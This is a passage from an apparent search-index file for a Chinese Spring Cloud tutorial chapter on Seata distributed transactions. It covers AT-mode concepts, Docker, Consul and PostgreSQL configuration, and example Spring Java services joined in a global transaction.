\uff0c\u8fd9\u662f\u5bb9\u5668\u5185\u7684\u5730\u5740\u3002\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u5982\u679c\u4ea7\u54c1\u4e5f\u662f\u8fd0\u884c\u5728 docker \u73af\u5883\u4e2d\uff0c\u53ea\u8981\u8bbe\u7f6e exposed \u5c31\u53ef\u4ee5\u4e86\u3002\u4f46\u662f\u73b0\u5728\u6211\u4eec\u7684\u4ea7\u54c1\u662f\u8fd0\u884c\u5728\u672c\u5730\u7684\uff0c\u800c seata \u8fd0\u884c\u5728 docker \u5185\uff0c\u8981\u4e48\u8ba9 docker \u7f51\u7edc\u548c\u672c\u5730\u7f51\u7edc\u76f8\u8fde\uff0c\u8981\u4e48\u628a\u4e00\u6574\u5957\u8fc1\u79fb\u5230\u672c\u5730\u3002 \u56e0\u6b64\u4e3a\u4e86\u907f\u514d\u9ebb\u70e6\uff0c\u4e0b\u9762\u7684\u6f14\u793a\u4f7f\u7528 file \u6a21\u5f0f\u914d\u7f6e\u3002 \u6570\u636e\u5e93\u914d\u7f6e \u7136\u540e\uff0cSeata \u9700\u8981\u4e00\u4e2a\u5355\u72ec\u7684\u6570\u636e\u5e93\uff0c\u7528\u4e8e\u4fdd\u5b58\u4e8b\u52a1\u4fe1\u606f\u3002\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u4ece Seata \u5b98\u65b9 \u4e0b\u8f7d \uff0c\u7136\u540e\u81ea\u884c\u5efa\u7acb\u4e00\u4e2a\u65b0\u7684\u540d\u4e3a seata \u7684\u6570\u636e\u5e93\uff0c\u5bfc\u5165\u8fd9\u4e2a\u6587\u4ef6\u3002 \u521b\u5efa\u4e4b\u540e\uff0c\u5e94\u8be5\u6709\u8fd9\u6837\u7684\u8868\uff1a \u4e4b\u540e\uff0c\u91cd\u65b0\u542f\u52a8 Seata \u670d\u52a1\uff0c\u4f1a\u6709\u4e00\u4e9b\u9519\u8bef\uff0c\u4f46\u662f\u6700\u540e\u4f1a\u6210\u529f\u542f\u52a8\u3002Seata \u9700\u8981\u4e00\u70b9\u65f6\u95f4\u4ece Consul \u8bfb\u53d6\u4fe1\u606f\u3002\u6700\u540e\uff0c\u547d\u4ee4\u884c\u4e0a\u4f1a\u8f93\u51fa web \u754c\u9762\u7684\u5730\u5740\uff0c\u8bbf\u95ee\u8fd9\u4e2a\u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230 Seata \u7684\u63a7\u5236\u53f0\u3002Consul \u4e2d\u4e5f\u4f1a\u6709 Seata \u670d\u52a1\u7684\u6ce8\u518c\u3002 \u8f93\u5165 application.yml \u91cc\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u754c\u9762\uff1a Seata \u7684\u4f7f\u7528 \u4e3a\u4e86\u6d4b\u8bd5\uff0c\u6211\u4eec\u4eba\u4e3a\u6784\u9020\u4e00\u4e2a\u6ca1\u6709\u610f\u4e49\u7684\u4e8b\u52a1\u3002\u73b0\u5728\u521b\u5efa\u4e24\u4e2a\u6570\u636e\u8868\uff0c\u6bcf\u4e2a\u6570\u636e\u8868\u90fd\u6709\u4e00\u4e2a id\uff0c\u7b2c\u4e00\u4e2a\u6570\u636e\u8868\u6709\u4e00\u4e2a name\uff0c\u7b2c\u4e8c\u4e2a\u6570\u636e\u8868\u6709\u4e00\u4e2a age\u3002\u6211\u4eec\u8981\u4fdd\u8bc1\u8fd9\u4e24\u4e2a\u8868\u7684\u6570\u636e\u8981\u4e48\u540c\u65f6\u63d2\u5165\uff0c\u8981\u4e48\u540c\u65f6\u5220\u9664\u3002 CREATE TABLE name ( id SERIAL PRIMARY KEY, name TEXT ); CREATE TABLE age ( id SERIAL PRIMARY KEY, age INT ); \u7136\u540e\u521b\u5efa\u5bf9\u5e94\u7684 Repository \u548c Record\u3002\u56e0\u4e3a\u6211\u4eec\u8981\u6d4b\u8bd5\u7684\u573a\u666f\u662f\u5206\u5e03\u5f0f\u4e8b\u52a1\uff0c\u5373\u82e5\u5e72\u5fae\u670d\u52a1\u90fd\u64cd\u4f5c\u6570\u636e\u5e93\u3002 \u6211\u4eec\u5728\u4e4b\u524d\u7684\uff0c\u4f5c\u4e3a provider \u7684 payment \u670d\u52a1\u4e2d\uff0c\u63d0\u4f9b\u4e00\u4e2a\u65b0\u7684 API\uff0c\u8fd9\u4e2a API \u5e94\u5f53\u5411 name \u8868\u63d2\u5165\u6570\u636e\u3002 package io.github.fingerbone.entity; import jakarta.persistence.Column; import jakarta.persistence.Entity; import jakarta.persistence.GeneratedValue; import jakarta.persistence.GenerationType; import lombok.AllArgsConstructor; import lombok.Data; @Entity @Data @AllArgsConstructor public class Name { @Column @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; @Column private String name; } package io.github.fingerbone.repository; import org.springframework.data.jpa.repository.JpaRepository; import org.springframework.stereotype.Repository; import io.github.fingerbone.entity.Name; @Repository public interface NameRepository extends JpaRepository<Name, Long> { } package io.github.fingerbone.service; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import io.github.fingerbone.entity.Name; import io.github.fingerbone.repository.NameRepository; import lombok.RequiredArgsConstructor; @Service @RequiredArgsConstructor public class NameService { private final NameRepository nameRepository; public void createName(String name) { System.out.println(\"Will create name with name: \" + name); nameRepository.save( new Name(null, name) ); } } package io.github.fingerbone.controller; import io.github.fingerbone.entity.Payment; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.service.NameService; import io.github.fingerbone.service.PaymentService; import io.github.fingerbone.wrapper.ResponseWrapper; import lombok.RequiredArgsConstructor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.DeleteMapping; import org.springframework.web.bind.annotation.PutMapping; import java.util.stream.Collectors; import java.util.List; @RestController @RequestMapping(\"/payment\") @RequiredArgsConstructor public class PaymentController { private final NameService nameService; @PostMapping(\"/name\") public void createName(@RequestParam String name) { nameService.createName(name); } } \u7136\u540e\u662f order \u670d\u52a1\uff0c\u8fd9\u4e2a\u670d\u52a1\u5e94\u5f53\u5411 age \u8868\u63d2\u5165\u6570\u636e\uff0c\u7136\u540e\u8bf7\u6c42 payment \u670d\u52a1\u63d2\u5165 name \u8868\u6570\u636e\u3002 @HttpExchange(\"http://payment-service/payment\") public interface PaymentAPIIf { @PostExchange(\"/name\") void createName(@RequestParam String name); } package io.github.fingerbone; import jakarta.persistence.Column; import jakarta.persistence.Entity; import jakarta.persistence.GeneratedValue; import jakarta.persistence.GenerationType; import lombok.AllArgsConstructor; import lombok.Data; @Entity @Data @AllArgsConstructor public class Age { @Id @Column @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; @Column private Short age; } package io.github.fingerbone; import org.springframework.data.jpa.repository.JpaRepository; import org.springframework.stereotype.Repository; @Repository public interface AgeRepository extends JpaRepository<Age, Long> { } package io.github.fingerbone; import org.springframework.stereotype.Service; import lombok.RequiredArgsConstructor; @Service @RequiredArgsConstructor public class AgeService { private final AgeRepository ageRepository; private final PaymentAPIIf paymentAPIIf; public void create(String name, Short age) { System.out.println(\"Will create age with name: \" + name + \" and age: \" + age); ageRepository.save( new Age(null, age) ); System.out.println(\"Will create name with name: \" + name); paymentAPIIf.createName(name); } } package io.github.fingerbone; import io.github.fingerbone.api.PaymentApi; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.wrapper.ResponseCode; import io.github.fingerbone.wrapper.ResponseWrapper; import io.github.resilience4j.bulkhead.annotation.Bulkhead; import io.github.resilience4j.circuitbreaker.annotation.CircuitBreaker; import lombok.Data; import lombok.RequiredArgsConstructor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.http.HttpEntity; import org.springframework.http.ResponseEntity; import org.springframework.web.bind.annotation.*; import org.springframework.web.client.RestTemplate; import org.springframework.core.ParameterizedTypeReference; import org.springframework.http.HttpMethod; import java.util.List; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestBody; @RestController @RequestMapping(\"/if/payment\") @RequiredArgsConstructor public class ConsumerPaymentController { private final AgeService ageService; @PostMapping(\"/age\") public void createAge(@RequestParam String name, @RequestParam Short age) { ageService.create(name, age); } } \u73b0\u5728\uff0c\u542f\u52a8\u4e24\u4e2a\u670d\u52a1\uff0c\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u53d1\u73b0 name \u8868\u4e0e age \u8868\u53ef\u4ee5\u88ab\u6b63\u786e\u64cd\u4f5c\u4e86\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5e0c\u671b\u63d2\u5165 name \u548c age \u4f5c\u4e3a\u540c\u4e00\u4e2a\u4e8b\u52a1\uff0c\u5373\u8981\u4e48\u540c\u65f6\u63d2\u5165\uff0c\u8981\u4e48\u540c\u65f6\u5220\u9664\u3002\u4e24\u4e2a\u5fae\u670d\u52a1\u7684\u4e24\u4e2a Service \u4f5c\u4e3a\u540c\u4e00\u4e2a\u4e8b\u52a1\u8fdb\u884c\u5904\u7406\u3002 \u53c2\u8003 Seata \u7684 \u6587\u6863 \uff0c\u5728 AT \u6a21\u5f0f\u4e0b\uff0c\u9700\u8981\u5728\u9700\u8981\u4e8b\u52a1\u64cd\u4f5c\u7684\u6570\u636e\u5e93\u4e2d\u521b\u5efa\u4e00\u4e2a undo_log \u8868\u3002\u811a\u672c\u5728 \u8fd9\u91cc \u3002 \u8981\u4f7f\u7528 Seata\uff0c\u53ea\u9700\u8981\u4e3a TM \u65b9\u6cd5\u52a0\u4e0a @GlobalTransactional \u6ce8\u89e3\u5373\u53ef\uff0c\u5373\u6574\u4e2a\u5fae\u670d\u52a1\u8c03\u7528\u94fe\u7684\u53d1\u8d77\u65b9\u6cd5\u3002 @GlobalTransactional(name = \"createUser\", timeoutMills = 10000, rollbackFor = Exception.class) \u73b0\u5728\uff0c\u5982\u679c\u5728\u88ab\u8c03\u5fae\u670d\u52a1\u4e2d\u624b\u52a8\u89e6\u53d1\u5f02\u5e38\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u5c3d\u7ba1\u547d\u4ee4\u884c\u4e2d\u8f93\u51fa\u4e86\u63d2\u5165\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u4f46\u6570\u636e\u5e93\u91cc\u5e76\u6ca1\u6709\u4fe1\u606f\uff0c\u8bf4\u660e\u89e6\u53d1\u4e86 Rollback\uff0c\u547d\u4ee4\u884c\u4e0a\u4e5f\u6709\u76f8\u5173\u7684\u8f93\u51fa\u3002 \u5728 Seata \u7684\u63a7\u5236\u53f0\u4e0a\uff0c\u4e5f\u6709\u76f8\u5173\u8bb0\u5f55\u3002","title":"Seata \u5206\u5e03\u5f0f\u4e8b\u52a1"},{"location":"11/#spring-cloud-ch11-seata","text":"Seata \u5c5e\u4e8e Spring Cloud Alibaba \u7684\u7ec4\u4ef6\uff0c\u8fd9\u91cc\u6211\u4eec\u4ecb\u7ecd\u5b83\u7684\u539f\u56e0\u662f Spring Cloud \u5b98\u65b9\u5e76\u6ca1\u6709\u63d0\u4f9b\u5206\u5e03\u5f0f\u4e8b\u52a1\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u800c Seata \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u4e8b\u52a1\u89e3\u51b3\u65b9\u6848\uff0c\u5b83\u63d0\u4f9b\u4e86 AT\u3001TCC\u3001SAGA\u3001XA \u56db\u79cd\u5206\u5e03\u5f0f\u4e8b\u52a1\u89e3\u51b3\u65b9\u6848\uff0c\u5176\u4e2d AT \u6a21\u5f0f\u662f\u6700\u5e38\u7528\u7684\u3002\u6211\u4eec\u53ea\u4ecb\u7ecd AT \u6a21\u5f0f\u3002","title":"Spring Cloud \u901f\u6210 Ch11 \u5206\u5e03\u5f0f\u4e8b\u52a1 Seata"},{"location":"11/#_1","text":"Spring \u4e2d\uff0c\u4e8b\u52a1\u662f\u6307\u7684\u662f\u4e00\u7ec4\u64cd\u4f5c\uff0c\u8981\u4e48\u5168\u90e8\u6210\u529f\uff0c\u8981\u4e48\u5168\u90e8\u5931\u8d25\u3002\u5728 Spring \u4e2d\u4f7f\u7528\u4e8b\u52a1\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 @Transactional \u6ce8\u89e3\uff0c\u5b83\u53ef\u4ee5\u7528\u5728\u7c7b\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u7528\u5728\u65b9\u6cd5\u4e0a\uff0c\u7528\u5728\u7c7b\u4e0a\u8868\u793a\u7c7b\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u90fd\u662f\u4e8b\u52a1\u6027\u7684\uff0c\u7528\u5728\u65b9\u6cd5\u4e0a\u8868\u793a\u8be5\u65b9\u6cd5\u662f\u4e8b\u52a1\u6027\u7684\u3002 @Service public class UserService { @Autowired private UserDao userDao; @Transactional public void add() { userDao.add(); int i = 1 / 0; } } \u52a0\u4e0a\u8fd9\u4e2a\u6ce8\u89e3\u540e\uff0cSpring \u4f1a\u5728\u65b9\u6cd5\u6267\u884c\u524d\u5f00\u542f\u4e00\u4e2a\u4e8b\u52a1\uff0c\u65b9\u6cd5\u6267\u884c\u540e\uff0c\u5982\u679c\u6ca1\u6709\u5f02\u5e38\uff0c\u4f1a\u63d0\u4ea4\u4e8b\u52a1\uff0c\u5982\u679c\u6709\u5f02\u5e38\uff0c\u4f1a\u56de\u6eda\u4e8b\u52a1\u3002\u8fd9\u91cc\u7684\u56de\u6eda\u662f\u901a\u8fc7 AOP \u5b9e\u73b0\u7684\uff0cSpring \u4f1a\u5728\u65b9\u6cd5\u6267\u884c\u524d\u540e\u63d2\u5165\u4e00\u4e9b\u4ee3\u7801\uff0c\u8fd9\u4e9b\u4ee3\u7801\u5c31\u662f\u4e8b\u52a1\u7684\u5b9e\u73b0\u3002","title":"\u4e8b\u52a1"},{"location":"11/#_2","text":"\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u4e8b\u52a1\u7684\u95ee\u9898\u4f1a\u66f4\u52a0\u590d\u6742\uff0c\u56e0\u4e3a\u4e8b\u52a1\u4e0d\u518d\u662f\u5728\u4e00\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u800c\u662f\u5728\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\u3002\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u4fdd\u8bc1\u4e8b\u52a1\u7684 ACID \u7279\u6027\uff0c \u539f\u5b50\u6027\uff08Atomicity\uff09\uff1a\u4e8b\u52a1\u662f\u4e00\u4e2a\u4e0d\u53ef\u5206\u5272\u7684\u5de5\u4f5c\u5355\u4f4d\uff0c\u8981\u4e48\u5168\u90e8\u6210\u529f\uff0c\u8981\u4e48\u5168\u90e8\u5931\u8d25\u3002\u4f46\u662f\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u4e8b\u52a1\u53ef\u80fd\u4f1a\u5728\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u4fdd\u8bc1\u6240\u6709\u6570\u636e\u5e93\u7684\u4e8b\u52a1\u8981\u4e48\u5168\u90e8\u6210\u529f\uff0c\u8981\u4e48\u5168\u90e8\u5931\u8d25\u3002 \u4e00\u81f4\u6027\uff08Consistency\uff09\uff1a\u4e8b\u52a1\u6267\u884c\u524d\u540e\uff0c\u6570\u636e\u7684\u5b8c\u6574\u6027\u6ca1\u6709\u88ab\u7834\u574f\u3002\u4f46\u662f\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u6570\u636e\u53ef\u80fd\u4f1a\u5728\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u4fdd\u8bc1\u6240\u6709\u6570\u636e\u5e93\u7684\u6570\u636e\u4e00\u81f4\u3002 \u9694\u79bb\u6027\uff08Isolation\uff09\uff1a\u4e8b\u52a1\u4e4b\u95f4\u662f\u76f8\u4e92\u9694\u79bb\u7684\uff0c\u4e00\u4e2a\u4e8b\u52a1\u7684\u6267\u884c\u4e0d\u4f1a\u5f71\u54cd\u53e6\u4e00\u4e2a\u4e8b\u52a1\u7684\u6267\u884c\u3002\u4f46\u662f\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u4e8b\u52a1\u53ef\u80fd\u4f1a\u5728\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u4fdd\u8bc1\u6240\u6709\u6570\u636e\u5e93\u7684\u4e8b\u52a1\u4e4b\u95f4\u662f\u9694\u79bb\u7684\u3002 \u6301\u4e45\u6027\uff08Durability\uff09\uff1a\u4e8b\u52a1\u6267\u884c\u540e\uff0c\u6570\u636e\u662f\u6301\u4e45\u5316\u7684\u3002\u4f46\u662f\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u6570\u636e\u53ef\u80fd\u4f1a\u5728\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u4fdd\u8bc1\u6240\u6709\u6570\u636e\u5e93\u7684\u6570\u636e\u662f\u6301\u4e45\u5316\u7684\u3002 Seata \u4fbf\u662f\u4e00\u4e2a\u89e3\u51b3\u5206\u5e03\u5f0f\u4e8b\u52a1\u7684\u89e3\u51b3\u65b9\u6848\u3002","title":"\u5206\u5e03\u5f0f\u4e8b\u52a1"},{"location":"11/#seata","text":"Seata \u6709\u4e09\u5927\u6838\u5fc3\u6982\u5ff5\uff1a TC\uff08Transaction Coordinator\uff09\uff1a\u4e8b\u52a1\u534f\u8c03\u5668\uff0c\u8d1f\u8d23\u4e8b\u52a1\u7684\u534f\u8c03\u548c\u5168\u5c40\u4e8b\u52a1\u7684\u7ba1\u7406\u3002\u5373 Seata \u672c\u8eab\u3002 TM\uff08Transaction Manager\uff09\uff1a\u4e8b\u52a1\u7ba1\u7406\u5668\uff0c\u8d1f\u8d23\u4e8b\u52a1\u7684\u5f00\u542f\u3001\u63d0\u4ea4\u3001\u56de\u6eda\u3002\u5373\u4e8b\u52a1\u7684\u53d1\u8d77\u8005\uff0c\u5b83\u8d1f\u8d23\u5b9a\u4e49\u5168\u5c40\u4e8b\u52a1\u7684\u8303\u56f4\uff0c\u5373\u8981\u64cd\u4f5c\u54ea\u4e9b\u6570\u636e\u5e93\u3002\u4e00\u822c\u662f\u7b2c\u4e00\u4e2a\u88ab\u8c03\u7684\uff0c\u5e26\u4e8b\u52a1\u6ce8\u89e3\u7684\u65b9\u6cd5\u3002 RM \uff08Resource Manager\uff09\uff1a\u8d44\u6e90\u7ba1\u7406\u5668\uff0c\u8d1f\u8d23\u7ba1\u7406\u5206\u652f\u4e8b\u52a1\u7684\u6ce8\u518c\u3001\u72b6\u6001\u6c47\u62a5\u3001\u56de\u6eda\u3002\u5373\u6570\u636e\u5e93\u672c\u8eab\u3002 \u6bcf\u4e2a Seata \u4e8b\u52a1\u7684\u751f\u547d\u5468\u671f\u5982\u4e0b\uff1a TM \u5f00\u542f\u4e00\u4e2a\u5168\u5c40\u4e8b\u52a1\uff0c\u751f\u6210\u4e00\u4e2a XID\uff08\u5168\u5c40\u4e8b\u52a1 ID\uff09\u3002 XID \u4f20\u9012\u7ed9 RM\uff0cRM \u751f\u6210\u4e00\u4e2a Branch ID\uff08\u5206\u652f\u4e8b\u52a1 ID\uff09\u3002 RM \u5f00\u542f\u4e00\u4e2a\u5206\u652f\u4e8b\u52a1\uff0c\u6267\u884c\u4e1a\u52a1\u903b\u8f91\u3002 RM \u5c06 Branch ID \u548c XID \u4f20\u9012\u7ed9\u6570\u636e\u5e93\uff0c\u6570\u636e\u5e93\u5c06 Branch ID \u548c XID \u4fdd\u5b58\u5230\u6570\u636e\u5e93\u4e2d\u3002 TM \u6536\u5230 RM \u7684\u8fd4\u56de\uff0c\u5982\u679c\u6240\u6709 RM \u90fd\u8fd4\u56de\u6210\u529f\uff0cTM \u63d0\u4ea4\u4e8b\u52a1\uff0c\u5982\u679c\u6709\u4e00\u4e2a RM \u8fd4\u56de\u5931\u8d25\uff0cTM \u56de\u6eda\u4e8b\u52a1\u3002 \u5bf9\u4e8e AT \u6a21\u5f0f\uff0c\u5177\u4f53\u800c\u8a00\uff0c\u662f\u901a\u8fc7\u9501\u548c\u4e24\u6b21\u63d0\u4ea4\u6765\u5b9e\u73b0\u7684\u3002 \u7b2c\u4e00\u4e2a\u9636\u6bb5\uff0c\u4e1a\u52a1\u6570\u636e\u548c\u56de\u6eda\u65e5\u5fd7\u5728\u540c\u4e00\u4e2a\u672c\u5730\u4e8b\u52a1\u4e2d\u63d0\u4ea4\uff0c\u5728\u63d0\u4ea4\u524d\u540e\uff0c\u4f1a\u8bb0\u5f55\u5feb\u7167\u3002\u7b2c\u4e00\u9636\u6bb5\u7ed3\u675f\u540e\uff0c\u4f1a\u751f\u6210\u884c\u9501\u3002\u7b2c\u4e00\u4e2a\u9636\u6bb5\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u672c\u5730\u4e8b\u52a1\u3002 \u7b2c\u4e8c\u4e2a\u9636\u6bb5\uff0c\u5982\u679c\u6ca1\u6709\u5f02\u5e38\uff0c\u53ea\u8981\u5220\u9664\u7b2c\u4e00\u9636\u6bb5\u7684\u9501\u3001\u65e5\u5fd7\u3001\u5feb\u7167\u5373\u53ef\u3002\u5982\u679c\u6709\u5f02\u5e38\uff0c\u4f1a\u901a\u8fc7\u7b2c\u4e00\u9636\u6bb5\u7684\u65e5\u5fd7\u548c\u5feb\u7167\u8fdb\u884c\u56de\u6eda\u3002","title":"Seata \u7684\u57fa\u672c\u539f\u7406"},{"location":"11/#seata_1","text":"\u4e3a\u4e86\u65b9\u4fbf\u90e8\u7f72\uff0c\u8fd9\u91cc\u4f9d\u7136\u4f7f\u7528 Docker\u3002\u4f46\u6ce8\u610f\uff0c\u4e00\u822c\u800c\u8a00\u6570\u636e\u5e93\u4e0d\u4f1a\u653e\u5728 Docker \u91cc\u3002\u5176\u5b83\u90e8\u7f72\u65b9\u5f0f\u89c1 \u6587\u6863 \u3002","title":"Seata \u7684\u914d\u7f6e"},{"location":"11/#_3","text":"\u9996\u5148\uff0c\u542f\u52a8\u4e00\u4e2a Seata \u670d\u52a1\uff1a seata-server: image: seataio/seata-server:2.0.0 ports: - \"7091:7091\" - \"8091:8091\" depends_on: - postgres - consul volumes: - ./seata/application.yml:/seata-server/resources/application.yml","title":"\u542f\u52a8\u670d\u52a1"},{"location":"11/#_4","text":"./seata/application.yml \u7684\u5177\u4f53\u5185\u5bb9\u8981\u6839\u636e\u4f60\u7684\u914d\u7f6e\u800c\u5b9a\uff0c\u6a21\u7248\u53ef\u4ee5\u5728\u5bb9\u5668\u5185\u7684 /seata-server/resources/application.example.yml \u627e\u5230\uff0c\u6216\u8005\u5728 GitHub \u3002 \u5982\u679c\u7528 consul \u548c postgres\uff0c\u914d\u7f6e\u5982\u4e0b\uff1a seata: config: # support: nacos \u3001 consul \u3001 apollo \u3001 zk \u3001 etcd3 type: consul consul: server-addr: consul:8500 acl-token: key: seata.properties registry: # support: nacos \u3001 eureka \u3001 redis \u3001 zk \u3001 consul \u3001 etcd3 \u3001 sofa type: consul consul: cluster: seata-server server-addr: consul:8500 acl-token: \u5176\u5b83\u7684\u914d\u7f6e\u90fd\u662f\u901a\u8fc7 Consul \u5b8c\u6210\u7684\u3002 \u6ce8\u610f\uff0c\u8fd9\u91cc register \u7684 cluster \u662f Consul \u7684\u670d\u52a1\u540d\uff0c\u4e4b\u540e\u6211\u4eec\u8981\u8981\u5728\u5ba2\u6237\u7aef\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\u8fd9\u4e2a\u670d\u52a1\u540d\u3002","title":"\u4fee\u6539\u914d\u7f6e"},{"location":"11/#server","text":"\u5982\u679c\u4f7f\u7528\u670d\u52a1\u4e2d\u5fc3\u65b9\u5f0f\uff0c\u9700\u8981\u5728\u670d\u52a1\u4e2d\u5fc3\u8fdb\u884c\u914d\u7f6e\u3002\u4e0b\u6587\u4ee5 Consul \u4e3a\u4f8b\u3002 \u8981\u628a Consul \u4f5c\u4e3a seata \u6ce8\u518c\u5730\uff0c\u542f\u52a8 seata \u524d\uff0c\u5c06 \u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6 \u63d0\u4ea4\u7ed9 consul\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528\u5b98\u65b9\u63d0\u4f9b\u7684 \u811a\u672c \uff0c\u8fdb\u5165\u5bb9\u5668\u5185\u4f7f\u7528\u3002\u6ce8\u610f\uff0cconfig.txt \u6587\u4ef6\u8981\u653e\u5728\u8fd9\u4e2a\u811a\u672c\u7684\u4e0a\u7ea7\u76ee\u5f55\u3002\u8fd9\u4e00\u6b65\u662f\u5c06 Consul \u4f5c\u4e3a\u6ce8\u518c\u4e2d\u5fc3\u9700\u8981\u7684\u3002 \u6ce8\u610f\uff0c\u56e0\u4e3a\u6211\u4eec\u7528\u4e86 postgres\uff0c\u8981\u4fee\u6539\u8fd9\u4e00\u90e8\u5206\u914d\u7f6e\u3002 store.db.datasource=druid store.db.dbType=postgresql store.db.driverClassName=org.postgresql.Driver store.db.url=jdbc:postgresql://postgres:5432/seata store.db.user=user store.db.password=password \u8fd9\u4e9b\u53c2\u6570\u7684\u542b\u4e49\u53c2\u8003\u8fd9\u4e2a \u6587\u6863 \u3002 \u800c\u5c06 Consul \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3\uff0c\u8fd8\u8981\u521b\u5efa\u4e00\u4e2a seata.properties \u6587\u4ef6\uff0c\u76ee\u524d\u7559\u7a7a\u5373\u53ef\uff0c\u56e0\u4e3a\u524d\u9762\u7684\u914d\u7f6e\u6587\u4ef6\u5df2\u7ecf\u5305\u542b\u4e86\u6240\u6709\u914d\u7f6e\u3002","title":"Server \u670d\u52a1\u6ce8\u518c\u4e0e\u914d\u7f6e"},{"location":"11/#client","text":"\u6211\u4eec\u8bb2\u89e3\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u552f\u4e00\u91cd\u8981\u7684\u6982\u5ff5\uff0c\u4e8b\u52a1\u5206\u7ec4\u3002\u4e8b\u52a1\u5206\u7ec4\u662f\u6307\u5c06\u4e00\u4e2a Seata \u96c6\u7fa4\u4e2d\u4e0d\u540c\u670d\u52a1\u5668\u5206\u6210\u82e5\u5e72\u7ec4\uff0c\u7136\u540e\u4e00\u4e9b\u5fae\u670d\u52a1\u4f1a\u4f7f\u7528\u67d0\u4e2a\u5206\u7ec4\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5728\u4e24\u4e2a\u670d\u52a1\u4e2d\u5f15\u5165 Seata Client \u7684\u4f9d\u8d56\u3002 implementation 'io.seata:seata-spring-boot-starter:2.0.0' implementation 'io.seata:seata-all:2.0.0' \u4f7f\u7528 Spring Boot \u65f6\uff0c\u9ed8\u8ba4\u7684\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b\uff0c seata: registry: type: consul consul: server-addr: 127.0.0.1:8500 # \u4e8b\u52a1\u5206\u7ec4\u914d\u7f6e\uff0c1.4.2 \u9ed8\u8ba4\u540d\u79f0\u4e3a my_test_tx_group \uff0c1.5\u7248\u672c\u5c06\u6539\u4e3a default_tx_group tx-service-group: my_test_tx_group service: # \u4e8b\u52a1\u5206\u7ec4\u4e0e\u96c6\u7fa4\u6620\u5c04\u5173\u7cfb vgroup-mapping: my_test_tx_group: default \u5168\u90e8\u7684\u914d\u7f6e\u53ef\u4ee5\u89c1 \u8fd9\u4e2a\u6587\u4ef6 \u3002 \u5177\u4f53\u800c\u8a00\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5fae\u670d\u52a1\uff0c\u5b83\u5728\u5bfb\u627e\u81ea\u5df1\u5bf9\u5e94\u7684 Seata \u670d\u52a1\u5668\u65f6\uff0c\u4f1a\u7ecf\u8fc7\u5982\u4e0b\u6b65\u9aa4\uff08\u5047\u8bbe\u4f7f\u7528 boot \u7248\u672c\uff09\uff1a Client \u4f1a\u5148\u5728\u914d\u7f6e\u6587\u4ef6\u7684 seata.tx-service-group \u4e2d\u627e\u5230\u4e8b\u52a1\u5206\u7ec4\u7684\u540d\u5b57\u3002\u8fd9\u4e2a\u503c\u9ed8\u8ba4\u662f my_test_tx_group\u3002 Client \u4f1a\u5728 seata.service.vgroupMapping.${seata.tx-service-group} \u4e2d\u627e\u5230\u8fd9\u4e2a\u5206\u7ec4\u5bf9\u5e94\u7684\u670d\u52a1\u540d\u3002\u8fd9\u4e2a\u503c\u8bb0\u4e3a\u5206\u7ec4\u540d group-name \u3002\u5982\u679c\u4f7f\u7528\u8fdc\u7a0b\u914d\u7f6e\uff0c\u8fd9\u4e2a\u503c\u7684 key \u7701\u7565\u4e3a service.vgroup-mapping.${seata.tx-service-group} \u3002 Client \u5728 service.grouplist.${group-name} \u627e\u5230\u8fd9\u4e2a\u5206\u7ec4\u7684\u670d\u52a1\u5668\u5730\u5740\u3002\u4f7f\u7528\u8fdc\u7a0b\u914d\u7f6e\u65f6\uff0c\u4f1a\u7528 ${group-name} 